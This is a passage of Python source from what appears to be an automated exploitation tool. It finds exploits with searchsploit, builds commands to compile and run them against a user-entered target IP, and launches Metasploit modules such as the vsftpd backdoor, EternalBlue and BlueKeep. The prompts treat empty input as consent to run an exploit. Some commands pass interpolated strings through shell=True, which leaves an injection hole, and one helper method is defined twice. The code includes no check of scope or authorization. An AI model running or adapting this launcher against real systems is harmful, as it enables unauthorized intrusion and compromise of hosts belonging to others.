                                    exploit_info["command"] = f"php {local_path} {target}"
                                    
                                return exploit_info
            except Exception as e:
                self.logger.error(f"Error copying exploit: {str(e)}")
                
            # Return a basic info if everything fails
            if exploit_ext.lower() == ".py":
                exploit_info["type"] = "python"
                exploit_info["command"] = f"python /tmp/{exploit_basename} {target}"
            elif exploit_ext.lower() == ".rb":
                exploit_info["type"] = "ruby"
                exploit_info["command"] = f"ruby /tmp/{exploit_basename} {target}"
            
            # Set fallback local path
            exploit_info["local_path"] = f"/tmp/{exploit_basename}"
            
            return exploit_info
                
        # Full path to the exploit
        full_path = os.path.join(exploit_dir, exploit_path)
        
        if os.path.exists(full_path):
            self.logger.info(f"Found exploit at: {full_path}")
            
            # Set the local path
            exploit_info["local_path"] = full_path
            
            # Determine exploit type by extension
            if exploit_ext.lower() == ".py":
                exploit_info["type"] = "python"
                exploit_info["command"] = f"python {full_path} {target}"
            elif exploit_ext.lower() == ".sh":
                exploit_info["type"] = "bash"
                exploit_info["command"] = f"bash {full_path} {target}"
            elif exploit_ext.lower() == ".rb" and "metasploit" not in exploit_info["type"]:
                exploit_info["type"] = "ruby"
                exploit_info["command"] = f"ruby {full_path} {target}"
            elif exploit_ext.lower() == ".c":
                exploit_info["type"] = "c"
                exploit_info["command"] = f"gcc {full_path} -o {exploit_name} && ./{exploit_name} {target}"
            elif exploit_ext.lower() == ".php":
                exploit_info["type"] = "php"
                exploit_info["command"] = f"php {full_path} {target}"
                
            return exploit_info
            
        # Try to find the exploit by traversing the exploit directory
        for root, dirs, files in os.walk(exploit_dir):
            for file in files:
                if exploit_basename == file:
                    full_path = os.path.join(root, file)
                    self.logger.info(f"Found exploit at: {full_path}")
                    
                    # Set the local path
                    exploit_info["local_path"] = full_path
                    
                    # Determine exploit type by extension
                    if exploit_ext.lower() == ".py":
                        exploit_info["type"] = "python"
                        exploit_info["command"] = f"python {full_path} {target}"
                    elif exploit_ext.lower() == ".sh":
                        exploit_info["type"] = "bash"
                        exploit_info["command"] = f"bash {full_path} {target}"
                    elif exploit_ext.lower() == ".rb" and "metasploit" not in exploit_info["type"]:
                        exploit_info["type"] = "ruby"
                        exploit_info["command"] = f"ruby {full_path} {target}"
                    elif exploit_ext.lower() == ".c":
                        exploit_info["type"] = "c"
                        exploit_info["command"] = f"gcc {full_path} -o {exploit_name} && ./{exploit_name} {target}"
                    elif exploit_ext.lower() == ".php":
                        exploit_info["type"] = "php"
                        exploit_info["command"] = f"php {full_path} {target}"
                        
                    return exploit_info
        
        # Try to use searchsploit -m as fallback
        try:
            # Extract ID from the path (e.g., 12345 from /path/to/12345.py)
            exploit_id = os.path.splitext(os.path.basename(exploit_path))[0]
            if exploit_id.isdigit():
                self.logger.info(f"Attempting to copy exploit using searchsploit -m {exploit_id}")
                
                # Use searchsploit to copy the exploit
                command = ["searchsploit", "-m", exploit_id]
                result = run_tool(command, timeout=10)
                
                if result["returncode"] == 0:
                    # Find the copied file in the current directory
                    current_dir = os.getcwd()
                    for file in os.listdir(current_dir):
                        if file.startswith(exploit_id) or file == exploit_basename:
                            local_path = os.path.join(current_dir, file)
                            
                            self.logger.info(f"Exploit copied to: {local_path}")
                            
                            # Update exploit info
                            exploit_info["local_path"] = local_path
                            
                            # Determine command based on file extension
                            if exploit_ext.lower() == ".py":
                                exploit_info["type"] = "python"
                                exploit_info["command"] = f"python {local_path} {target}"
                            elif exploit_ext.lower() == ".sh":
                                exploit_info["type"] = "bash"
                                exploit_info["command"] = f"bash {local_path} {target}"
                            elif exploit_ext.lower() == ".rb" and "metasploit" not in exploit_info["type"]:
                                exploit_info["type"] = "ruby"
                                exploit_info["command"] = f"ruby {local_path} {target}"
                            elif exploit_ext.lower() == ".c":
                                exploit_info["type"] = "c"
                                exploit_info["command"] = f"gcc {local_path} -o {exploit_name} && ./{exploit_name} {target}"
                            elif exploit_ext.lower() == ".php":
                                exploit_info["type"] = "php"
                                exploit_info["command"] = f"php {local_path} {target}"
                                
                            return exploit_info
        except Exception as e:
            self.logger.error(f"Error copying exploit: {str(e)}")
        
        self.logger.error("Error preparing exploit: Could not find exploit file")
        return exploit_info

    def _is_binary(self, content):
        """
        Check if content appears to be binary
        
        Args:
            content (str): File content
            
        Returns:
            bool: True if content appears to be binary
        """
        # Check for null bytes or high number of non-printable characters
        # which indicates a binary file
        non_printable = 0
        for char in content:
            if char == '\0' or ord(char) > 127:
                non_printable += 1
        
        # If more than 10% is non-printable, it's likely binary
        return non_printable > len(content) * 0.1

    def _extract_metasploit_path(self, exploit_path):
        """
        Extract Metasploit module path from the given exploit path
        
        Args:
            exploit_path (str): The path to the exploit
            
        Returns:
            str: The Metasploit module path, or None if no module path is found
        """
        # Special cases for very common exploits
        if "vsftpd" in exploit_path.lower() and "2.3.4" in exploit_path:
            return "unix/ftp/vsftpd_234_backdoor"
        
        if "eternal blue" in exploit_path.lower() or "ms17-010" in exploit_path.lower():
            return "windows/smb/ms17_010_eternalblue"
        
        if "shellshock" in exploit_path.lower() or "cgi-bin" in exploit_path.lower():
            return "multi/http/apache_mod_cgi_bash_env_exec"
        
        # Common module path patterns
        patterns = [
            r'/(unix|windows|multi|linux)/([^/]+)/([^/]+)$',  # Basic pattern
            r'/(unix|windows|multi|linux)/([^/]+)/([^/]+)/([^/]+)$',  # More specific pattern
            r'/(unix|windows|multi|linux)/([^/]+)/([^/]+)\.rb$',  # Ruby file pattern
        ]
        
        for pattern in patterns:
            match = re.search(pattern, exploit_path)
            if match:
                # Extract the components
                platform = match.group(1)  # unix, windows, multi, linux
                category = match.group(2)  # http, ftp, smb, etc.
                
                # Start building the path
                msf_path = f"{platform}/{category}/"
                
                # Add the rest based on the matched pattern
                if len(match.groups()) >= 3:
                    exploit_name = match.group(3).replace(".rb", "")
                    msf_path += exploit_name
                
                # If there's a 4th component in some cases
                if len(match.groups()) >= 4:
                    sub_exploit = match.group(4).replace(".rb", "")
                    msf_path += f"/{sub_exploit}"
                
                return msf_path
                
        # Try simple pattern extraction for known platforms
        known_platforms = ["unix", "windows", "multi", "linux"]
        known_services = ["ftp", "http", "ssh", "smb", "mysql", "mssql", "postgresql"]
        
        # Check if path contains platform and service
        for platform in known_platforms:
            if f"/{platform}/" in exploit_path.lower():
                for service in known_services:
                    if f"/{service}/" in exploit_path.lower() or service in exploit_path.lower():
                        # Extract name based on file name
                        file_name = os.path.basename(exploit_path)
                        name_part = os.path.splitext(file_name)[0].lower()
                        
                        # Create reasonable path
                        return f"{platform}/{service}/{name_part}"
        
        # Couldn't extract a path
        return None
        
    def _is_binary(self, content):
        """
        Check if content appears to be binary
        
        Args:
            content (str): File content
            
        Returns:
            bool: True if content appears to be binary
        """
        # Check for null bytes or high number of non-printable characters
        # which indicates a binary file
        non_printable = 0
        for char in content:
            if char == '\0' or ord(char) > 127:
                non_printable += 1
        
        # If more than 10% is non-printable, it's likely binary
        return non_printable > len(content) * 0.1

    def display_exploit_instructions(self, exploit_info, target):
        """
        Display detailed instructions on how to use the selected exploit and offer to run it
        
        Args:
            exploit_info: Dictionary with exploit information
            target: Target IP address
        """
        # Check if exploit_info is a dictionary or a string
        if not exploit_info:
            self.console.print("[red]No exploit information available[/red]")
            return
            
        # If target is localhost or 127.0.0.1, warn and get real target
        if target in ["localhost", "127.0.0.1"]:
            self.console.print("[yellow]Warning: Target is set to localhost. This may not work for exploiting remote systems.[/yellow]")
            target = self.get_target_ip(target)
            if not target:
                return
        
        self.console.print("\n[bold blue]Exploit Information:[/bold blue]")
        
        # Display exploit information
        if isinstance(exploit_info, dict):
            title = exploit_info.get('title', 'Unknown Title')
            path = exploit_info.get('path', 'Path not available')
            exploit_type = exploit_info.get('type', 'Unknown')
            platform = exploit_info.get('platform', 'Unknown')
            
            self.console.print(f"Title: [cyan]{title}[/cyan]")
            self.console.print(f"Path: [cyan]{path}[/cyan]")
            self.console.print(f"Type: [cyan]{exploit_type}[/cyan]")
            self.console.print(f"Platform: [cyan]{platform}[/cyan]")
            
            # Try to get the local path of the exploit
            local_path = self.prepare_exploit(path, target)
            if local_path:
                self.console.print(f"Local file: [green]{local_path}[/green]")
                
                # Check if this is a Metasploit module
                if "msf" in path.lower() or path.endswith(".rb"):
                    self.console.print("\n[bold green]This is a Metasploit module. Here's how to use it:[/bold green]")
                    
                    # Extract Metasploit path
                    msf_path = self._extract_metasploit_path(path)
                    if msf_path:
                        self.console.print(f"\n[bold]Run the following commands in msfconsole:[/bold]")
                        self.console.print(f"msfconsole")
                        self.console.print(f"use {msf_path}")
                        self.console.print(f"set RHOSTS {target}")
                        self.console.print(f"show options")
                        self.console.print(f"exploit")
                        
                        # Ask if user wants to run metasploit directly
                        self.console.print("\n[yellow]Would you like to launch Metasploit and run this exploit now? (y/n)[/yellow]")
                        response = input("> ").strip().lower()
                        
                        if response in ["y", "yes", ""]:
                            # Try to run the exploit with msfconsole
                            self.console.print("[cyan]Launching Metasploit...[/cyan]")
                            try:
                                cmd = f"msfconsole -q -x 'use {msf_path}; set RHOSTS {target}; show options; exploit'"
                                self.console.print(f"[green]Running: {cmd}[/green]")
                                subprocess.run(cmd, shell=True)
                            except Exception as e:
                                self.console.print(f"[red]Error running Metasploit: {str(e)}[/red]")
                                self.console.print("[yellow]You can run it manually using the commands shown above.[/yellow]")
                    else:
                        self.console.print("[yellow]Could not determine Metasploit module path.[/yellow]")
                        self.console.print("[yellow]Try running msfconsole and search for the module manually.[/yellow]")
                
                # Python exploit
                elif path.endswith(".py"):
                    self.console.print("\n[bold green]This is a Python exploit. Here's how to use it:[/bold green]")
                    self.console.print(f"python {local_path} {target}")
                    
                    # Ask if the user wants to run the exploit now
                    self.console.print("\n[yellow]Would you like to run this exploit now? (y/n)[/yellow]")
                    response = input("> ").strip().lower()
                    
                    if response in ["y", "yes", ""]:
                        # Check if the exploit needs to be modified
                        self.console.print("[cyan]Checking if the exploit needs to be modified...[/cyan]")
                        try:
                            with open(local_path, 'r') as f:
                                content = f.read()
                                
                            # Look for RHOST, lhost, or similar variables
                            if "RHOST" in content or "rhost" in content or "target" in content:
                                self.console.print("[yellow]This exploit may need to be modified with the target IP.[/yellow]")
                                self.console.print("[yellow]Opening the file for review before running.[/yellow]")
                                self.console.print(f"[green]Please review {local_path} and modify if needed.[/green]")
                                
                                # Give the user a chance to review/modify
                                self.console.print("[yellow]Press Enter when ready to run the exploit, or 'q' to cancel[/yellow]")
                                response = input("> ").strip().lower()
                                if response == 'q':
                                    return
                            
                            # Run the exploit
                            self.console.print(f"[cyan]Running: python {local_path} {target}[/cyan]")
                            result = subprocess.run(["python", local_path, target], capture_output=True, text=True)
                            
                            # Display the output
                            if result.stdout:
                                self.console.print("\n[bold]Exploit output:[/bold]")
                                self.console.print(result.stdout)
                            
                            if result.stderr:
                                self.console.print("\n[bold red]Errors:[/bold red]")
                                self.console.print(result.stderr)
                                
                            # For vsftpd 2.3.4 specific case - it often requires a second connection attempt
                            if "vsftpd 2.3.4" in title and "Connection refused" in result.stderr:
                                self.console.print("[yellow]The vsftpd backdoor sometimes requires multiple attempts.[/yellow]")
                                self.console.print("[yellow]Would you like to try running it again? (y/n)[/yellow]")
                                retry = input("> ").strip().lower()
                                if retry in ["y", "yes", ""]:
                                    self.console.print(f"[cyan]Retrying: python {local_path} {target}[/cyan]")
                                    result = subprocess.run(["python", local_path, target], capture_output=True, text=True)
                                    
                                    # Display the output of the retry
                                    if result.stdout:
                                        self.console.print("\n[bold]Exploit output (retry):[/bold]")
                                        self.console.print(result.stdout)
                                    
                                    if result.stderr:
                                        self.console.print("\n[bold red]Errors (retry):[/bold red]")
                                        self.console.print(result.stderr)
                        except Exception as e:
                            self.console.print(f"[red]Error running exploit: {str(e)}[/red]")
                            self.console.print(f"[yellow]You can try running it manually with: python {local_path} {target}[/yellow]")
                
                # C exploit
                elif path.endswith(".c"):
                    self.console.print("\n[bold green]This is a C exploit that needs to be compiled. Here's how to use it:[/bold green]")
                    self.console.print(f"gcc -o exploit {local_path}")
                    self.console.print(f"./exploit {target}")
                    
                    # Ask if the user wants to compile and run now
                    self.console.print("\n[yellow]Would you like to compile and run this exploit now? (y/n)[/yellow]")
                    response = input("> ").strip().lower()
                    
                    if response in ["y", "yes", ""]:
                        # Compile the exploit
                        self.console.print("[cyan]Compiling exploit...[/cyan]")
                        try:
                            compile_cmd = f"gcc -o exploit {local_path}"
                            subprocess.run(compile_cmd, shell=True, check=True)
                            self.console.print("[green]Compilation successful![/green]")
                            
                            # Run the exploit
                            self.console.print(f"[cyan]Running: ./exploit {target}[/cyan]")
                            subprocess.run(["./exploit", target])
                        except subprocess.CalledProcessError:
                            self.console.print("[red]Compilation failed. The exploit may need modifications to compile.[/red]")
                        except Exception as e:
                            self.console.print(f"[red]Error: {str(e)}[/red]")
                
                # PHP exploit
                elif path.endswith(".php"):
                    self.console.print("\n[bold green]This is a PHP exploit. Here's how to use it:[/bold green]")
                    self.console.print(f"php {local_path} {target}")
                    
                    # Ask if the user wants to run it now
                    self.console.print("\n[yellow]Would you like to run this exploit now? (y/n)[/yellow]")
                    response = input("> ").strip().lower()
                    
                    if response in ["y", "yes", ""]:
                        self.console.print(f"[cyan]Running: php {local_path} {target}[/cyan]")
                        try:
                            subprocess.run(["php", local_path, target])
                        except Exception as e:
                            self.console.print(f"[red]Error running exploit: {str(e)}[/red]")
                
                # Plain text exploit or other type
                else:
                    self.console.print("\n[bold green]This looks like a text file with exploit instructions:[/bold green]")
                    
                    # Try to read the file content
                    try:
                        with open(local_path, 'r', errors='ignore') as f:
                            content = f.read()
                        
                        # Check if file is too large
                        if len(content) > 5000:
                            # Show just the first part with relevant instructions
                            self.console.print(content[:5000] + "\n\n[italic]... (content truncated, open the file to see more)[/italic]")
                        else:
                            self.console.print(content)
                    except Exception as e:
                        self.console.print(f"[red]Error reading file: {str(e)}[/red]")
                        
                    self.console.print(f"\n[yellow]You can view the full exploit instructions in: {local_path}[/yellow]")
            else:
                self.console.print("[yellow]Could not prepare the exploit locally. Try using searchsploit to locate it manually.[/yellow]")
                self.console.print(f"[yellow]Command: searchsploit -p {path.split('/')[-1].split('.')[0]}[/yellow]")
        else:
            # Handle the case where exploit_info is a string
            self.console.print(f"Basic information: {exploit_info}")
            self.console.print("[yellow]Limited information available. Try using searchsploit to find more details.[/yellow]")
            self.console.print(f"[yellow]Command: searchsploit {exploit_info}[/yellow]")

    def get_target_ip(self, current_target=None):
        """
        Ask the user for a target IP or use existing one
        
        Args:
            current_target: Current target IP if available
            
        Returns:
            String: Target IP to use
        """
        # Check if we have a valid target already
        if current_target and current_target not in ["localhost", "127.0.0.1"]:
            # We have a valid target
            self.console.print(f"[cyan]Current target: {current_target}[/cyan]")
            self.console.print("[yellow]Would you like to use a different target IP? (y/n)[/yellow]")
            response = input("> ").strip().lower()
            
            if response not in ["y", "yes"]:
                return current_target
        
        # If current target is localhost or user wants to change it
        if current_target in ["localhost", "127.0.0.1"]:
            self.console.print("[yellow]The current target is set to localhost. This may not work for remote exploitation.[/yellow]")
        
        # Try to get target from config
        config_target = None
        if hasattr(self.config, 'target') and self.config.target and self.config.target not in ["localhost", "127.0.0.1"]:
            config_target = self.config.target
            self.console.print(f"[green]Found target in configuration: {config_target}[/green]")
        
        # Ask user for the target
        self.console.print("[bold]Enter the target IP address to attack:[/bold]")
        if config_target:
            self.console.print(f"[dim](Press Enter to use {config_target})[/dim]")
        
        user_input = input("> ").strip()
        
        if not user_input and config_target:
            # Use the target from config
            self.console.print(f"[green]Using target from configuration: {config_target}[/green]")
            return config_target
        elif user_input:
            # Validate IP
            if self._is_valid_ip(user_input):
                self.console.print(f"[green]Using target: {user_input}[/green]")
                return user_input
            else:
                self.console.print(f"[yellow]Warning: '{user_input}' does not appear to be a valid IP address. Using it anyway.[/yellow]")
                return user_input
        else:
            # If all else fails, return current_target or localhost
            return current_target or "localhost"
    
    def _is_valid_ip(self, ip):
        """
        Validate if string is an IP address
        
        Args:
            ip: String to check
            
        Returns:
            Boolean: True if valid IP
        """
        try:
            parts = ip.split(".")
            return len(parts) == 4 and all(0 <= int(part) <= 255 for part in parts)
        except:
            return False

    def run_msfconsole(self, target_ip=None):
        """
        Run msfconsole with a target IP

        Args:
            target_ip (str, optional): Target IP address. If not provided, will prompt for one.
        """
        # Get a valid target IP
        if not target_ip or target_ip == "localhost" or target_ip == "127.0.0.1":
            target_ip = self.get_target_ip(target_ip)
        
        self.console.print(f"[bold cyan]Starting Metasploit console targeting {target_ip}[/bold cyan]")
        
        # Ask user if they want to run a specific Metasploit module
        self.console.print("[yellow]Would you like to run a specific Metasploit module? (y/n)[/yellow]")
        response = input("> ").strip().lower()
        
        if response in ["y", "yes"]:
            # List common modules as options
            common_modules = [
                "exploit/unix/ftp/vsftpd_234_backdoor",
                "exploit/multi/http/apache_juddi_upload_exec",
                "exploit/unix/webapp/php_xml_rpc_eval",
                "exploit/windows/smb/ms17_010_eternalblue",
                "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
                "exploit/multi/http/tomcat_mgr_deploy",
                "exploit/multi/http/jenkins_script_console"
            ]
            
            self.console.print("[bold]Common modules:[/bold]")
            for i, module in enumerate(common_modules, 1):
                self.console.print(f"{i}. {module}")
            
            self.console.print("[bold]Enter a module (number from list, full path, or 's' to search):[/bold]")
            module_response = input("> ").strip()
            
            if module_response.isdigit() and 1 <= int(module_response) <= len(common_modules):
                module = common_modules[int(module_response) - 1]
            elif module_response.lower() == 's':
                self.console.print("[bold]Enter search term for Metasploit module:[/bold]")
                search_term = input("> ").strip()
                
                if search_term:
                    try:
                        # Use msfconsole to search for modules
                        search_cmd = ["msfconsole", "-q", "-x", f"search {search_term}; exit"]
                        self.console.print(f"[cyan]Searching for Metasploit modules matching '{search_term}'...[/cyan]")
                        result = run_tool(search_cmd, timeout=30)
                        
                        if result["returncode"] == 0 and result["stdout"]:
                            self.console.print("\n[bold cyan]Search results:[/bold cyan]")
                            self.console.print(result["stdout"])
                            
                            self.console.print("\n[bold]Enter a module path from the results above:[/bold]")
                            module = input("> ").strip()
                        else:
                            self.console.print("[yellow]No results found or search failed.[/yellow]")
                            return
                    except Exception as e:
                        self.console.print(f"[red]Error searching for modules: {str(e)}[/red]")
                        return
                else:
                    self.console.print("[yellow]No search term provided.[/yellow]")
                    return
            else:
                module = module_response
            
            # Ask for additional module options
            self.console.print("[bold]Any additional options? (e.g., 'set LHOST 192.168.1.100') - Enter blank line when done:[/bold]")
            options = []
            while True:
                option = input("> ").strip()
                if not option:
                    break
                options.append(option)
            
            # Build the msfconsole command
            commands = [f"use {module}", f"set RHOSTS {target_ip}"]
            commands.extend(options)
            commands.append("run")
            
            msfconsole_cmd = ["msfconsole", "-q", "-x", "; ".join(commands)]
            
            self.console.print(f"[bold cyan]Running msfconsole with module {module} targeting {target_ip}[/bold cyan]")
            self.console.print(f"Command: {' '.join(msfconsole_cmd)}")
            
            try:
                # Run msfconsole with a longer timeout since exploits might take time
                result = run_tool(msfconsole_cmd, timeout=600)
                
                if result["stdout"]:
                    self.console.print(result["stdout"])
                if result["stderr"]:
                    self.console.print(f"[red]{result['stderr']}[/red]")
                
                # Check for common success indicators
                if "Meterpreter session" in result["stdout"] or "Command shell session" in result["stdout"]:
                    self.console.print("[green]Session established successfully![/green]")
                elif result["returncode"] != 0:
                    self.console.print(f"[red]Command exited with status {result['returncode']}[/red]")
            except Exception as e:
                self.console.print(f"[red]Error running msfconsole: {str(e)}[/red]")
        
        else:
            # Just open msfconsole without any specific module
            self.console.print(f"[cyan]Starting plain msfconsole. Use 'set RHOSTS {target_ip}' when needed.[/cyan]")
            
            try:
                # Run msfconsole in a subprocess
                subprocess.run(["msfconsole"])
            except Exception as e:
                self.console.print(f"[red]Error running msfconsole: {str(e)}[/red]")
                
                # Fallback to showing the command
                self.console.print("[yellow]Command failed. Try running msfconsole manually:[/yellow]")
                self.console.print("msfconsole")

    def interactive_exploit_menu(self, service_name, product_name, version, target):
        """
        Interactive menu for exploiting vulnerabilities
        
        Args:
            service_name: Service name
            product_name: Product name
            version: Product version
            target: Target address
        """
        self.logger.info(f"Starting exploit menu for {service_name} {version}")
        
        # Check if target is localhost and request valid IP
        target = self.get_target_ip(target)
        if not target:
            return
        
        # Search for vulnerabilities using searchsploit
        vulnerabilities = self.find_vulnerabilities_with_searchsploit(product_name, version)
        
        if not vulnerabilities or not isinstance(vulnerabilities, list):
            self.console.print("[yellow]No known vulnerabilities found. Would you like to try a custom search?[/yellow] (y/n)")
            response = input("> ").strip().lower()
            
            if response in ["y", "yes", ""]:
                self.console.print("[cyan]Enter search term (e.g., vsftpd):[/cyan]")
                search_term = input("> ").strip()
                vulnerabilities = self.find_vulnerabilities_with_searchsploit(search_term)
        
        if vulnerabilities and isinstance(vulnerabilities, list):
            self.console.print("\n[bold blue]Found Vulnerabilities:[/bold blue]")
            for i, vuln in enumerate(vulnerabilities, 1):
                if isinstance(vuln, dict):
                    title = vuln.get('title', 'Unknown Title')
                    path = vuln.get('path', 'Path not available')
                    self.console.print(f"{i}. {title} ({path})")
                elif isinstance(vuln, str):
                    self.console.print(f"{i}. {vuln}")
            
            self.console.print("\n[cyan]Select vulnerability number to exploit (or 'q' to quit):[/cyan]")
            choice = input("> ").strip()
            
            if choice.lower() != 'q':
                try:
                    index = int(choice) - 1
                    if 0 <= index < len(vulnerabilities):
                        selected_vuln = vulnerabilities[index]
                        if isinstance(selected_vuln, dict):
                            self.display_exploit_instructions(selected_vuln, target)
                        else:
                            self.console.print(f"[yellow]Selected vulnerability info: {selected_vuln}[/yellow]")
                    else:
                        self.console.print("[red]Invalid selection[/red]")
                except ValueError:
                    self.console.print("[red]Invalid selection[/red]")
        else:
            self.console.print("[yellow]No vulnerabilities found[/yellow]")